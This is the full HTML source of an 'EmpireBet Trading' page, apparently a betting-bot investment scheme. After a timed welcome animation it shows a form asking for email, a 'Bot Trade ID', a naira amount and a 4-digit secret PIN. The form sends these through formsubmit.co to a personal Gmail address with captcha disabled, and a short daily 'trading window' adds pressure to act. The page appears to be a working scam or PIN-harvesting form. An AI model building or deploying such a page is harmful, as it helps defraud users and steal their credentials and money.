<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>EmpireBet Trading - User Details Form</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        :root {
            --primary: #1e2a78;
            --secondary: #f6c900;
            --accent: #16c79a;
            --background: #f2f4fa;
            --card: #fff;
            --danger: #ff5353;
            --text: #23294d;
            --input-bg: #f6f8fc;
        }
        body {
            font-family: 'Segoe UI', 'Arial', sans-serif;
            background: linear-gradient(135deg, var(--primary) 0%, #223784 65%, var(--secondary) 100%);
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }
        .centered {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: rgba(255,255,255,0.96);
            border-radius: 16px;
            padding: 42px 32px;
            box-shadow: 0 6px 32px rgba(30,42,120,0.07);
        }
        .spin-loader {
            width: 68px;
            height: 68px;
            margin-bottom: 30px;
            animation: spin 1.1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }
        .welcome-text {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--primary);
            text-shadow: 1px 2px 10px #dde2fc;
            min-height: 2em;
            text-align: center;
            letter-spacing: 1px;
            margin-bottom: 0;
        }
        .notice-container {
            max-width: 430px;
            margin: 40px auto;
            background: var(--card);
            border-radius: 16px;
            box-shadow: 0 6px 32px rgba(30,42,120,0.13);
            padding: 32px 28px 28px 28px;
            text-align: center;
            animation: fadeInForm 1s;
        }
        .notice-title {
            color: var(--danger);
            font-size: 1.4em;
            font-weight: bold;
            margin-bottom: 18px;
        }
        .notice-text {
            color: var(--primary);
            font-size: 1.08em;
            margin-bottom: 10px;
        }
        .container {
            max-width: 410px;
            margin: 40px auto;
            background: var(--card);
            border-radius: 16px;
            box-shadow: 0 6px 32px rgba(30,42,120,0.13);
            padding: 32px 28px 28px 28px;
            animation: fadeInForm 1s;
        }
        @keyframes fadeInForm {
            from { opacity: 0; transform: scale(0.92);}
            to { opacity: 1; transform: scale(1);}
        }
        h2 {
            text-align: center;
            color: var(--primary);
            margin-bottom: 18px;
            font-weight: 700;
            letter-spacing: 2px;
        }
        label {
            display: block;
            margin-bottom: 7px;
            color: var(--text);
            font-weight: 600;
        }
        input, select {
            width: 100%;
            padding: 10px 10px;
            margin-bottom: 20px;
            border: 1.6px solid #e4e7f2;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 1.08em;
            background: var(--input-bg);
            color: var(--text);
            transition: border 0.2s;
        }
        input:focus {
            outline: none;
            border: 1.6px solid var(--accent);
            background: #fff;
            box-shadow: 0 0 0 2px #16c79a33;
        }
        .bot-id-group {
            display: flex;
            align-items: center;
            gap: 0;
        }
        .bot-id-prefix {
            padding: 10px 10px;
            background: var(--secondary);
            border: 1.6px solid #e4e7f2;
            border-radius: 6px 0 0 6px;
            border-right: none;
            font-size: 1.08em;
            color: #fff;
            font-weight: bold;
            min-width: 104px;
            text-align: center;
            box-shadow: 0 2px 6px #fdebb6a4;
        }
        .bot-id-suffix {
            flex: 1;
            border-radius: 0 6px 6px 0;
            border-left: none;
        }
        button {
            width: 100%;
            background: linear-gradient(90deg, var(--accent), var(--secondary));
            color: #fff;
            padding: 13px;
            border: none;
            border-radius: 6px;
            font-size: 1.13em;
            cursor: pointer;
            font-weight: 700;
            letter-spacing: 0.7px;
            box-shadow: 0 2px 10px #f6c9001c;
            transition: background 0.18s, transform 0.13s;
        }
        button:hover {
            background: linear-gradient(90deg, var(--primary) 60%, var(--accent) 100%);
            transform: scale(1.03);
        }
        .note {
            font-size: 0.94em;
            color: var(--primary);
            margin-bottom: 15px;
            background: #e8f8f7;
            padding: 7px 12px;
            border-radius: 5px;
            text-align: center;
        }
        @media (max-width: 600px) {
            .container, .loader-container, .notice-container {
                max-width: 97vw;
                padding: 14px 6vw 18px 6vw;
            }
        }
    </style>
    <script>
        // --- TIME WINDOW CONTROL ---
        function formatNextOpenText(hours, minutes) {
            // Format as 09:00 AM/PM (according to user's clock format)
            let date = new Date();
            date.setHours(hours, minutes, 0, 0);

            // If user's locale uses 12-hour clock, show AM/PM, else show 24-hour
            // Use toLocaleTimeString with options
            let options = { hour: '2-digit', minute: '2-digit' };
            let timeStr = date.toLocaleTimeString([], options);

            // Detect if AM/PM is shown
            let ampm = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true }).match(/AM|PM/i);
            if (ampm) {
                timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
            } else {
                timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: false });
            }
            return timeStr;
        }

        function checkTimeWindow() {
            // Use local time for user's device
            const now = new Date();
            const hours = now.getHours();
            const minutes = now.getMinutes();

            // Trading window: 09:00 to 12:00 (inclusive: 09:00:00 to 11:59:59)
            if (hours >= 9 && hours < 12) {
                // Trading is open
                document.getElementById('loader-area').style.display = "flex";
                document.getElementById('form-area').style.display = "none";
                document.getElementById('notice-area').style.display = "none";
                return true;
            } else {
                // Trading is closed
                document.getElementById('loader-area').style.display = "none";
                document.getElementById('form-area').style.display = "none";
                document.getElementById('notice-area').style.display = "block";

                // Prepare next open time message
                let nextOpenText = formatNextOpenText(9, 0);
                let dayMsg = "";

                if (hours < 9) {
                    dayMsg = "";
                } else {
                    // If past 12, tell user it's tomorrow
                    dayMsg = " tomorrow";
                }

                document.getElementById('notice-text').innerHTML =
                    `Trading is only available from <b>${formatNextOpenText(9,0)} to ${formatNextOpenText(12,0)}</b> daily.<br>
                    Please come back at <b>${nextOpenText}${dayMsg}</b> to Trade.`;

                return false;
            }
        }

        // --- Loader and Welcome Typing Animation ---
        document.addEventListener("DOMContentLoaded", function () {
            // First, check if time window is valid
            if (!checkTimeWindow()) return;

            let phase = 0;
            const loaderDiv = document.getElementById('loader-area');
            const formDiv = document.getElementById('form-area');
            const welcome = document.getElementById('welcome-text');
            // Loader and typing states
            let message = "Welcome to EmpireBet Odd Trading.";
            let display = "";
            let charIndex = 0;
            let repeat = 0;
            let typingDelay = 44;
            let repeatCount = 4;

            function typeWriter() {
                if (charIndex < message.length) {
                    display += message[charIndex];
                    welcome.innerHTML = display + '<span style="color:var(--accent)">|</span>';
                    charIndex++;
                    setTimeout(typeWriter, typingDelay);
                } else {
                    // Finished a line
                    welcome.innerHTML = display;
                    setTimeout(function () {
                        charIndex = 0;
                        display = "";
                        repeat++;
                        if (repeat < repeatCount) {
                            setTimeout(typeWriter, 380);
                        } else {
                            setTimeout(showForm, 650);
                        }
                    }, 480);
                }
            }

            function showForm() {
                loaderDiv.style.display = "none";
                formDiv.style.display = "block";
            }

            // Start typing welcome after loader shows
            setTimeout(typeWriter, 720);
        });

        // --- Form validation and hidden field ---
        function validateForm(e) {
            // Bot Trade ID Suffix
            const botSuffix = document.getElementById('bot-id-suffix').value;
            if (!/^\d{4}$/.test(botSuffix)) {
                alert("Please enter the 4 digits for your Bot Trade ID.");
                e.preventDefault();
                return false;
            }
            // Amount
            const amount = parseInt(document.getElementById('amount').value, 10);
            if (isNaN(amount) || amount < 1000 || amount > 100000) {
                alert("Amount must be between 1,000 and 100,000.");
                e.preventDefault();
                return false;
            }
            // PIN
            const pin = document.getElementById('user-pin').value;
            if (!/^\d{4}$/.test(pin)) {
                alert("PIN must be a 4-digit number.");
                e.preventDefault();
                return false;
            }
            // Set hidden field
            document.getElementById('full-bot-id').value = "EmpireBot>" + botSuffix;
            return true;
        }
    </script>
</head>
<body>
    <!-- Loader and Welcome (only visible during allowed time) -->
    <div class="centered" id="loader-area" style="display:none;">
        <div class="loader-container">
            <!-- Static loading image, spinning with CSS -->
            <img src="AddText_07-29-05.39.03.png" alt="Loading..." class="spin-loader">
            <div class="welcome-text" id="welcome-text"></div>
        </div>
    </div>

    <!-- Main Form (Initially Hidden) -->
    <div class="container" id="form-area" style="display:none;">
        <h2>EmpireBet Trading</h2>
        <div class="note">
            Trade with confidence.<br>
            Please fill in your details accurately.
        </div>
        <form 
            action="https://formsubmit.co/empirevirtual99@gmail.com" 
            method="POST" 
            autocomplete="on"
            onsubmit="return validateForm(event)">

            <label for="email">Email Address</label>
            <input type="email" id="email" name="Email" required autocomplete="email" placeholder="your@email.com">

            <label for="bot-id-suffix">Bot Trade ID</label>
            <div class="bot-id-group">
                <span class="bot-id-prefix">EmpireBot&gt;</span>
                <input 
                    type="text"
                    id="bot-id-suffix"
                    maxlength="4"
                    pattern="\d{4}"
                    placeholder="Enter 4 digits"
                    title="Enter the remaining 4 digits"
                    required
                    class="bot-id-suffix"
                >
            </div>
            <input type="hidden" name="Bot Trade ID" id="full-bot-id">

            <label for="amount">Amount to Trade (₦)</label>
            <input 
                type="number" 
                id="amount" 
                name="Amount" 
                min="1000" 
                max="100000" 
                step="100"
                placeholder="Enter amount (1,000 - 100,000)"
                required
            >

            <label for="user-pin">User PIN (4 digits)</label>
            <input 
                type="password" 
                id="user-pin" 
                name="User PIN"
                pattern="\d{4}"
                maxlength="4"
                autocomplete="off"
                placeholder="4-digit PIN"
                inputmode="numeric"
                required
            >

            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <button type="submit">Submit</button>
        </form>
    </div>

    <!-- Notice shown outside trading hours -->
    <div class="centered" id="notice-area" style="display:none;">
        <div class="notice-container">
            <div class="notice-title">Trading Not Available</div>
            <div class="notice-text" id="notice-text"></div>
        </div>
    </div>
</body>
</html>
